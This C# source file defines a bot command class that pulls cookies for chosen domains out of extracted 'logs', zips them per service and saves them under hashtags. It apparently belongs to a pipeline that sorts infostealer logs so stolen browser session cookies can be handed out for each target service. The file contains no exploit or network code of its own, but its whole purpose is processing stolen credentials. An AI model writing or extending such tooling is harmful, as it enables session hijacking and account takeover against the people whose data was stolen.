using Bot.Models.Data;
using Bot.Parsers.Abstractions;
using Bot.Services;

using SharpCompress.Archives;
using SharpCompress.Common;
using SharpCompress.Writers.Zip;

namespace Bot.Commands.Base {
	public abstract class CookiesCallback(string[] domains,string service, IFileParser<IEnumerable<string>, string> parser, Client client, TasksManager tasks, FilesManager files) : ProcessCallback("Cookies", service, "Zip", $"Parse {service} cookies", $"Cookies {service} not found", $"#{service.ToLower()} #cookies", client, tasks, files) {
		private protected override async Task<FileEntity?> _ParseAsync(string logs_name) {
			using var archive = ArchiveFactory.Create(ArchiveType.Zip);

			foreach (var cookies in parser.FromLogs(Path.Combine(Constants.Directory_Extracted, logs_name), domains)) {
				if (!await cookies.AnyAsync()) {
					continue;
				}

				var memory = new MemoryStream();

				await using (var writer = new StreamWriter(memory, leaveOpen: true)) {
					await foreach (var line in cookies) {
						await writer.WriteLineAsync(line);
					}
				}

				archive.AddEntry($"{Guid.NewGuid().ToString()}.txt", memory, true);
			}

			if (!archive.Entries.Any()) {
				return null;
			}

			return await files.SaveFileAsync(
				stream => archive.SaveTo(stream, new ZipWriterOptions(CompressionType.None)),
				Category,
				Service,
				logs_name,
				FileType
			);
		}
	}
}